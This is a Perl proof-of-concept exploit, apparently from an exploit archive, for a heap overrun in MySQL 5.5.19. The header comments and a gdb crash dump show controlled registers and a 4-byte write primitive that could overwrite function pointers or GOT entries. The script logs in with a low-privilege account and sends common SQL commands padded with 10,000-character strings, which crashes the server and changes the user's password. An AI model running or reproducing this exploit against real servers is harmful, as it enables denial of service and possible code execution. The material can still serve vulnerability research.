# MySQL Heap Overrun
# tested for the latest version of mysql server on a SuSE Linux system
#
# As seen below $edx and $edi are fully controlled,
# the current instruction is
# => 0x83a6b24 <free_root+180>:   mov    (%edx),%edi
# this means we landed in a place where 4 bytes can be controlled by 4 bytes
# with this function pointers and GOT entries can be rewritten to execute arbritrary code
#
# a user account (with less privileges) is needed
# beware: this script will change the users password to an undefined value
#

=for comment
Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xa86b3b70 (LWP 9219)]
free_root (root=0x8e7c714, MyFlags=1) at /root/mysql-5.5.19/mysys/my_alloc.c:369
369         old=next; next= next->next;
(gdb) bt
#0  free_root (root=0x8e7c714, MyFlags=1) at /root/mysql-5.5.19/mysys/my_alloc.c:369
#1  0x082a2e9f in cleanup (thd=0x8e7b9b8, all=true) at /root/mysql-5.5.19/sql/sql_class.h:1709
#2  ha_rollback_trans (thd=0x8e7b9b8, all=true) at /root/mysql-5.5.19/sql/handler.cc:1401
#3  0x0824a747 in trans_rollback (thd=0x8e7b9b8) at /root/mysql-5.5.19/sql/transaction.cc:260
#4  0x081897a7 in THD::cleanup (this=0x8e7b9b8) at /root/mysql-5.5.19/sql/sql_class.cc:1271
#5  0x08140fc3 in thd_cleanup (thd=0x8e7b9b8) at /root/mysql-5.5.19/sql/mysqld.cc:2026
#6  unlink_thd (thd=0x8e7b9b8) at /root/mysql-5.5.19/sql/mysqld.cc:2075
#7  0x08141088 in one_thread_per_connection_end (thd=0x8e7b9b8, put_in_cache=true) at /root/mysql-5.5.19/sql/mysqld.cc:2188
#8  0x0823eab3 in do_handle_one_connection (thd_arg=0x8e7b9b8) at /root/mysql-5.5.19/sql/sql_connect.cc:796
#9  0x0823ebbc in handle_one_connection (arg=0x8e7b9b8) at /root/mysql-5.5.19/sql/sql_connect.cc:708
#10 0xb7744b05 in start_thread () from /lib/libpthread.so.0
#11 0xb750fd5e in clone () from /lib/libc.so.6
(gdb) i r
eax            0x8ec63b8        149709752
ecx            0xa86b326c       -1469369748
edx            0x5a5a5a5a       1515870810
ebx            0x880eff4        142667764
esp            0xa86b31b0       0xa86b31b0
ebp            0xa86b31d8       0xa86b31d8
esi            0x8e7c714        149407508
edi            0x5a5a5a5a       1515870810
eip            0x83a6b24        0x83a6b24 <free_root+180>
eflags         0x210293 [ CF AF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/10i $eip
=> 0x83a6b24 <free_root+180>:   mov    (%edx),%edi
   0x83a6b26 <free_root+182>:   je     0x83a6b33 <free_root+195>
   0x83a6b28 <free_root+184>:   mov    %edx,(%esp)
   0x83a6b2b <free_root+187>:   call   0x83acb70 <my_free>
   0x83a6b30 <free_root+192>:   mov    0x8(%esi),%eax
   0x83a6b33 <free_root+195>:   test   %edi,%edi
   0x83a6b35 <free_root+197>:   jne    0x83a6b20 <free_root+176>
   0x83a6b37 <free_root+199>:   test   %eax,%eax
   0x83a6b39 <free_root+201>:   movl   $0x0,(%esi)
   0x83a6b3f <free_root+207>:   movl   $0x0,0x4(%esi)
(gdb)
=cut

use Net::MySQL;
use Encode;
$|=1;

  my $mysql = Net::MySQL->new(
      hostname => '192.168.2.3',
      database => "test",
      user     => "user",
      password => "test",
      debug => 0,
      port => 3306,
  );

@commands = ('USE d', 'SHOW TABLES FROM d', "DESCRIBE t", "SHOW FIELDS FROM t", "SHOW COLUMNS FROM t", "SHOW INDEX FROM t",
			 "CREATE TABLE table_name (c CHAR(1))", "DROP TABLE t", "ALTER TABLE t DROP c",
			 "DELETE FROM t WHERE 1=1", "UPDATE t SET a=a","SET PASSWORD=PASSWORD('p')");
  
foreach my $command (@commands) {
	for ($k=0;$k<length($command);$k++) {
		$c = substr($command, 0, $k) . "Z" x 10000 . substr($command, $k+1);
		$c2 = substr($command, 0, $k) . "AAAA..AA" . substr($command, $k+1);
		
		print "$c2";
  		$mysql->query($c);
	}
}
  $mysql->close;